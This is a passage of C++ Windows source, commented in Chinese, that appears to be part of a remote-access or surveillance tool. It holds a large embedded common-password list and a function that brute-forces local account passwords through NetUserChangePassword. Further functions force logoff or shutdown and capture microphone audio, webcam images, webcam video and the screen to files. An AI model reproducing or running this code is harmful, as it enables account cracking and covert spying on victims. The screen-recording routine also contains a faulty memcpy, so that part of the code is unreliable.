","angelina","playgirl","sweet16","012345","bhebhe","marcos","loveme1","milagros","lilmama","beyonce","lovely1","catdog","armando","margarita","151515","loves","202020","gerard","undertaker","amistad","capricorn","delfin","cheerleader","password2","PASSWORD","lizzie","matthew1","enrique","badgirl","141414","dancing","cuteme","amelia","skyline","angeles","janine","carlitos","justme","legolas","michelle1","jesuschrist","ilovejesus","tazmania","tekiero","thebest","princesita","lucky7","jesucristo","buddy1","regina","myself","lipgloss","jazmin","rosita","chichi","pangit","mierda","hernandez","arturo","silvia","melvin","celeste","pussycat","gorgeous","honeyko","mylife","babyboo","loveu","lupita","panthers","hollywood","alfredo","musica","sparkle","kristina","sexymama","crazy","scarface","098765","hayden","micheal","242424","marisol","jeremiah","mhine","isaiah","lolipop","butterfly1","xbox360","madalina","anamaria","yourmom","jasmine1","bubbles1","beatriz","diamonds","friendship","sweetness","desiree","741852","hannah1","julius","leanne","marie1","lover1","twinkle","february","bebita","twilight","pollito","ashlee","cookie1","beckham","simone","nursing","torres","damian","joshua1","babyface","dinamo","mommy","juliana","cassandra","redsox","gundam","ou812","Monday","thx1138","Internet","ncc1701d","test1","absolut","babylon5","backup","bird33","porsche911","Bond007","Friday","Hendrix","October","Taurus","challenge","mazda1","ncc1701e","0007","1022","10sne1","3bears","Broadway","Fisher","Jeanne","Killer","Knight","Master","Pepper","Sierra","Tennis","abacab","ace","acropolis","anders","avenir","bass","ben","bliss","bugsy","cannondale","catnip","civil","content","cook","cordelia","crack1","cyber","daisie","dark1","dickens","farout","farside","feedback","fidel","firenze","fish1","gargoyle","intrepid","jkl123","johanna1","kidder","kirk","kris","lambda","lorrie","mariner","mark1","media","merlot","midway","mmouse","mopar","nermal","nina","olsen","opera","overkill","polar","primus","prometheus","rastafarian","reptile","rob","rodeo","rolex","rouge","salasana","scarecrow","scuba1","sergey","skibum","skunk","sound","starter","sting1","tbird","teflon","terminal","the","thejudge","tokyo","tree","trout","val","wolf1","yukon","1213","1214","1225","1818","1991","1kitty","2020","2112","2kids","5050","57chevy","7dwarfs","Animals","Ariel","Bismillah","Booboo","Boston","Carol","Computer","Creative","Curtis","Denise","Eagles","Esther","Fishing","Freddy","Gandalf","Golden","Goober","Hacker","Harley","Henry","Hershey","Jackson","Jersey","Joanna","Johnson","Katie","Kitten","Liberty","Lindsay","Lizard","Madeline","Margaret","Maxwell","Money","Monster","Pamela","Peaches","Peter","Phoenix","Piglet","Pookie","Rabbit","Raiders","Random","Russell","Sammy","Saturn","Skeeter","Smokey","Sparky","Speedy","Sterling","Theresa","Thunder","Vincent","Willow","Winnie","Wolverine","aaaa","aardvark","abbott","acura","admin1","adrock","aerobics","agent","airwolf","ali","alien","allegro","allstate","altamira","altima1","andrew!","ann","anneli","aptiva","arrow","asdf;lkj","assmunch","baraka","barnyard","bart","bartman","beasty","beavis1","bebe","belgium","beowulf","beryl","best","bharat","bichon","bigal","biker","bills","bimmer","biochem","birdy","blinds","blitz","bluejean","bogey","bogus","boulder","bourbon","boxer","brain","branch","britain","broker","bucks","buffett","bugs","bulls","burns","c00per","calgary","camay","cement","cessna","chad","chainsaw","chameleon","chang","chess","chinook","chouette","chronos","cicero","circuit","cirque","cirrus","clapton","clarkson","claudel","cleo","cliff","clock","color","comet","concorde","coolbean","corky","cornflake","cows","crescent","cross","crowley","cthulhu","cunt","current","cutlass","daedalus","dagger1","daily","dale","dana","decker","dharma","dillweed","dipper","disco","dixon","doitnow","doors","dork","dutch","effie","ella","engage","eric1","ernie1","escort1","faculty","fairview","faust","fenris","finance","fishhead","flanders","fleurs","flute","flyboy","flyer","franka","free","front242","frontier","funtime","gaelic","gambler","gammaphi","garfunkel","garth","gateway2","gator1","gibbons","gigi","gilgamesh","godiva","goethe","good","gramps","gravis","greed","greg1","greta","gumby","hamid","hank","hawkeye1","health1","hello8","help123","helper","homerj","hoosier","hope","huang","hugo","hydrogen","ib6ub9","insight","instructor","integral","iomega","iris","izzy","jeepster","jetta1","joanie","josee","joy","julia2","jumbo","jump","justice4","kalamazoo","kali","kat","kate","kerala","kiwi","laserjet","lassie1","leblanc","legal","leo","life","lions","liz","logger","logos","loislane","loki","longer","lori","lost","lotus","lou","macross","madoka","makeitso","mallard","mattingly","mechanic","meister","mercer","merde","merrill","michal","michou","mickel","mobydick","mojo","montana3","montrose","motor","mowgli","mulder1","muscle","neil","neutrino","newaccount","nicklaus","nightshade","nightwing","nike","none1","nopass","nouveau","novell","oaxaca","obsession","orville","otter","ozzy","packrat","paint","paradigm","pavel","peterk","phialpha","phishy","piano1","pianoman","pianos","pipeline","poetic","printing","provider","qqq111","qwer","racer","radar","rafiki","raleigh","rasta1","redcloud","redfish","redwood","reed","rene","rhino","ripple","rita","robocop","robotics","roche","roni","rossignol","rugger","safety1","saigon","satori","saturn5","schnapps","secret3","seeker","services","sex","shazam","shelter","sigmachi","signal","signature","simsim","skydive","slick","smegma","smurfy","sober1","spazz","sphynx","spock","spoon","spot","sprocket","starbuck","steel","stephi","stocks","storage","strato","stud","student2","susanna","swanson","swim","switzer","system5","talon","tarheel","tata","tazdevil","thisisit","thorne","tightend","tool","total","toucan","transfer","transit","transport","trapper","trash","trophy","tucson","turbo2","unity","upsilon","vedder","vikram","virago","visual","volcano","walden","waldo","webmaster","wedge","whale1","whit","whoville","wibble","will","wombat1","world","x-files","xxx123","zack","zepplin","zoltan","zoomer","21122112","911","FuckYou","Fuckyou","Gizmo","Hello","Michel","Qwerty","Windows","changeit","christoph","classroom","french1","hilbert","macintosh","ne1469","scrooge","forum","rotimi","god","saved","2580","1998","1928","mmm","1911","1948","1996","5252","Champs","Tuesday","draft","hal9000","herzog","huey","jethrotull","jussi","snowski","1316","1412","1430","1952","1953","1955","1956","1qw23e","22","2200","2252","3010","3112","4788","6262","Alpha","Bastard","Beavis","Cardinal","Celtics","Cougar","Darkman","Figaro","Fortune","Geronimo","Hammer","Homer","Janet","Mellon","Merlot","Metallic","Montreal","Newton","Paladin","Peanuts","Service","Vernon","Waterloo","Webster","aki123","aqua","beta","car","chinacat","cora","courier","eieio","elina1","fly","funguy","fuzz","ggeorge","glider1","heikki","histoire","hugh","if6was9","ingvar","jedi","jimi","juhani","lima","midvale","neko","nesbit","nexus6","nisse","notta1","pam","park","pole","pope","pyro","reliant","rex","rush","seoul","skip","stan","sue","suzy","tab","testi","thelorax","tika","tnt","toto1","tre","wind","x-men","xyz","zxc","Abcdef","Asdfgh","Changeme","NCC1701","Zxcvbnm","doom2","e","good-luck","m1911a1","ne1410s","ne14a69","sample123","0852","OU812","majordomo","Pentium","Raistlin","adi","m","plus","y","zzz","1332","1950","3141","3533","4055","4854","6301","Bonzo","ChangeMe","Front242","Gretel","Michel1","Noriko","Sidekick","Sverige","Swoosh","Woodrow","aa","ayelet","barn","betacam","biz","boat","cuda","hallowell","haro","hosehead","i","ilmari","irmeli","j1l2t3","jer","kcin","kerrya","kissa2","leaf","lissabon","mart","matti1","mech","morecats","paagal","performa","ratio","ship","slip","stivers","tapani","targas","test2","test3","tula","xanth","1701d","Qwert","sss" };
        if (mode == 0) {
            int len = sizeof(deflist) / 28;
            for (int i = 0; i < len; i++) {
                wchar_t* passwd = string_to_wchar(deflist[i]);
                Status = NetUserChangePassword(NULL, name, passwd, passwd);
                delete passwd;
                if (Status == NERR_Success) {
                    delete name;
                    string result = "===== Find!!! User -> " + username + " | Password -> ";
                    result += deflist[i];
                    result += "=====";
                    return result;
                }
            }
            return "===== Not Found =====";
        }
        else if (mode == 1) {
            wchar_t* passwd = string_to_wchar(args1);
            Status = NetUserChangePassword(NULL, name, passwd, passwd);
            if (Status == NERR_Success) return "测试密码正确！";
            return User_ERROR_TEXT(Status);
        }
        else if (mode == 2) {
            string passwd;
            fstream dict(args1, ios::in);
            if (!dict) return args1 + "打开失败";

            while (!dict.eof()) {
                dict >> passwd;
                wchar_t* pass = string_to_wchar(passwd);
                Status = NetUserChangePassword(NULL, name, pass, pass);
                delete pass;
                if (Status == NERR_Success) {
                    delete name;
                    string result = "===== Find!!! Wordlist -> " + args1 + " | ";
                    result += "User -> " + username + " | ";
                    result += "Password -> " + passwd + "=====";
                    return result;
                }
            }

            dict.close();
            return "===== Not Found =====";
        }
        delete name;
        return "请正确选择模式";
    }
    

    string Get_Shutdown_Privilege(int mode) {
        //当前线程token的句柄
        HANDLE hToken;
        TOKEN_PRIVILEGES tkp;
        BOOL status;               // system shutdown flag 

        //获取当前线程的token
        status = OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken);
        if (!status) return "获取当前线程token失败";
        //获取关机特权的特权标识符（LUID）
        LookupPrivilegeValue(NULL, SE_SHUTDOWN_NAME, &tkp.Privileges[0].Luid);
        //权限数量
        tkp.PrivilegeCount = 1;
        //设置权限已启用
        tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
        //获取关机特权，该函数用于启用/禁用特权
        status = AdjustTokenPrivileges(hToken, FALSE, &tkp, 0, (PTOKEN_PRIVILEGES)NULL, 0);
        if (!status) return "获取关机特权失败";

        //注销当前用户，第二个参数指定为未定义的关闭
        if (mode == 1) ExitWindowsEx(EWX_LOGOFF, 0);
        //关机
        else if (mode == 2) ExitWindowsEx(EWX_POWEROFF, 0);
        //重启
        else if (mode == 3) ExitWindowsEx(EWX_REBOOT, 0);


        //使用完将权限重新禁用
        tkp.Privileges[0].Attributes = SE_PRIVILEGE_REMOVED;
        status = AdjustTokenPrivileges(hToken, FALSE, &tkp, 0, (PTOKEN_PRIVILEGES)NULL, 0);
        if (!status) return "恢复特权失败";

        return "操作成功";
    }

    void record(int Time, string filename) {
        //波形音频输入设备句柄
        HWAVEIN hi;
        //文件指针
        FILE* pf;

        //定义波形音频数据格式
        WAVEFORMATEX waveform;
        //音频格式为PCM裸流
        waveform.wFormatTag = WAVE_FORMAT_PCM;
        //单通道
        waveform.nChannels = 1;
        //采样速率,16000Hz
        waveform.nSamplesPerSec = 16000;
        //平均数据传输速率
        waveform.nAvgBytesPerSec = 16000;
        //块对齐方式，以字节为单位
        waveform.nBlockAlign = 2;
        //WFormatTag 格式类型的每个样本的位数。
        waveform.wBitsPerSample = 16;

        //采集音频时包含数据缓存的结构体
        WAVEHDR wh;
        //缓冲区大小，已写死
        wh.dwBufferLength = 102400;
        wh.dwBytesRecorded = 0;
        wh.dwUser = 0;
        wh.dwFlags = 0;
        //循环播放次数，用于输出数据到缓冲区
        wh.dwLoops = 1;

        //打开波形音频输入设备进行录制
        //输入设备句柄，输入设备标识符，音频所需格式指针，不需要回调函数，回调机制的数据，没有回调机制
        waveInOpen(&hi, WAVE_MAPPER, &waveform, 0, 0, CALLBACK_NULL);
        //打开文件
        fopen_s(&pf, filename.data(), "wb");

        while (Time--)
        {
            BYTE* buf = new BYTE[102400];
            wh.lpData = (LPSTR)buf;
            //准备波形音频输入缓冲器
            waveInPrepareHeader(hi, &wh, sizeof(WAVEHDR));
            //发送输入缓冲器到给定的音频输入设备
            waveInAddBuffer(hi, &wh, sizeof(WAVEHDR));
            //开始输入
            waveInStart(hi);
            //暂停，等待音频数据写入
            Sleep(1000);
            //停止输入并重置
            waveInReset(hi);
            //将缓冲区内的数据写入到文件中
            fwrite(buf, 1, wh.dwBytesRecorded, pf);
            delete[] buf;
        }
        //释放资源
        fclose(pf);
        waveInClose(hi);
    }

    //调用摄像头截图
    //指定截图数量及截图延迟(秒)，指定保存文件夹(反斜杠结尾)
    void camera_screen(int count, int delay = 1, string dirname = "") {
        VideoCapture capture(0);

        for (int i = 1; i <= count; i++) {
            Mat frame;
            string imgname = dirname + "sf_" + to_string(i) + ".png";

            capture >> frame;
            imwrite(imgname, frame);
            Sleep(delay * 1000);
        }
    }

    //使用摄像头录制视频，生成mp4格式文件
    //指定录制时长（秒），每帧之间的延迟，视频的fps，输出文件名
    void camera_video(int Time, int delay, float fps, string filename) {
        VideoCapture capture(0);
        Mat frame;
        int ropen = clock();

        Size size = Size((int)capture.get(CAP_PROP_FRAME_WIDTH), (int)capture.get(CAP_PROP_FRAME_HEIGHT));
        VideoWriter writer(filename, VideoWriter::fourcc('m', 'p', '4', 'v'), fps, size);
        while (true) {
            capture >> frame;
            writer << frame;
            int rtime = (double(clock() - ropen) / CLOCKS_PER_SEC);
            if (rtime > Time) break;
            Sleep(delay);
        }
    }

    //录制本地屏幕，生成mp4文件
    //指定录制时长（秒），视频的fps，录制每帧之间的延迟，输出文件名
    int record_screen(int Time, int fps, int delay, string filename)
    {

        VideoWriter videoWriter;
        int format = VideoWriter::fourcc('m', 'p', '4', 'v');
        int width = GetSystemMetrics(SM_CXSCREEN);
        int height = GetSystemMetrics(SM_CYSCREEN);
        clock_t ropen = clock();

        videoWriter.open(filename, format, fps, Size(width, height), true);
        if (!videoWriter.isOpened()) return -1;

        HDC hCurrScreen = GetDC(NULL);
        HDC hCmpDC = CreateCompatibleDC(hCurrScreen);
        HBITMAP hbmScreen = CreateCompatibleBitmap(hCurrScreen, width, height);
        SelectObject(hCmpDC, hbmScreen);

        //BMP图像信息头
        BITMAPINFOHEADER hBmpInfo;
        //大小
        hBmpInfo.biSize = sizeof(BITMAPINFOHEADER);
        //宽高
        hBmpInfo.biWidth = width;
        hBmpInfo.biHeight = height;
        //为目标设备说明位面数，其值将总是被设为1
        hBmpInfo.biPlanes = 1;
        //使用彩色表中的颜色索引数，0代表使用所有
        hBmpInfo.biClrUsed = 0;
        //说明比特数/像素
        hBmpInfo.biBitCount = 24;
        //说明图像大小，使用BI_RGB格式时可以设置为0
        hBmpInfo.biSizeImage = 0;
        //说明图象数据压缩的类型,BI_RGB代表没有压缩
        hBmpInfo.biCompression = BI_RGB;
        //说明对图象显示有重要影响的颜色索引的数目，如果是0，表示都重要
        hBmpInfo.biClrImportant = 0;
        //分辨率，使用BI_RGB格式时可以设置为0
        hBmpInfo.biXPelsPerMeter = 0;
        hBmpInfo.biYPelsPerMeter = 0;

        while (true) {
            //数据缓冲区，用一次删一次
            //x3的原因是RGB三通道
            char* data = new char[width * height * 3];
            //相当于创建了一块与bmp图像同等大小的画布
            //CV_8UC3代表8位无符号整数以及RGB3通道图像
            Mat MatData(height, width, CV_8SC3);
            //将屏幕截图写入内存
            BitBlt(hCmpDC, 0, 0, width, height, hCurrScreen, 0, 0, SRCCOPY);
            //将图像数据复制到缓存中
            GetDIBits(hCmpDC, hbmScreen, 0, height, data, (BITMAPINFO*)&hBmpInfo, DIB_RGB_COLORS);
            //将数据放进opencv接受的数据类型
            memcpy(&MatData.data, &data, sizeof(data));
            //bmp中数据从左下到右上，视频帧图像需要从左上到右下
            //所以这里进行倒影操作
            flip(MatData, MatData, 0);
            videoWriter << MatData;
            delete[] data;

            int rtime = (double(clock() - ropen) / CLOCKS_PER_SEC);
            if (rtime > Time) break;
            Sleep(delay);
        }
        videoWriter.release();
        return 0;
    }
};

